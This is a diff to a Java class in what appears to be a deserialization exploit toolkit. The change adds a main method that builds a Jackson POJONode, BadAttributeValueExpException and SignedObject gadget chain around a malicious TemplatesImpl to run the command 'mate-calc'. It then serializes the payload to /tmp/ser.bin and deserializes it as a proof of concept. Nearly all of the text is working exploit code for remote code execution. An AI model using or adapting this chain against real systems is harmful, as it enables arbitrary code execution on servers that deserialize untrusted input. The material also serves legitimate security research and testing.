@@ -5,6 +5,7 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import xyz.eki.marshalexp.gadget.jdk.GBadAttributeValueExpException;
 import xyz.eki.marshalexp.gadget.jdk.GSignedObject;
 import xyz.eki.marshalexp.sink.jdk.GTemplates;
+import xyz.eki.marshalexp.utils.SerializeUtils;
 
 import javax.management.BadAttributeValueExpException;
 import javax.xml.transform.Templates;
@@ -27,7 +28,15 @@ public class GJackson {
         POJONode jsonNodes1 = new POJONode(evilTemplates);
         BadAttributeValueExpException e = GBadAttributeValueExpException.deserialize2ToString(jsonNodes1);
         SignedObject signedObject = GSignedObject.getter2Deserialize(e);
+
         POJONode jsonNodes2 = new POJONode(signedObject);
         return jsonNodes2;
+    }
+
+    public static void main(String[] args) throws Exception {
+        POJONode jsonNodes = toString2RCEWithSignedObject("mate-calc");
+        BadAttributeValueExpException bd = GBadAttributeValueExpException.deserialize2ToString(jsonNodes);
+        SerializeUtils.serialize(bd, "/tmp/ser.bin");
+        SerializeUtils.deserialize("/tmp/ser.bin");
     }
 }
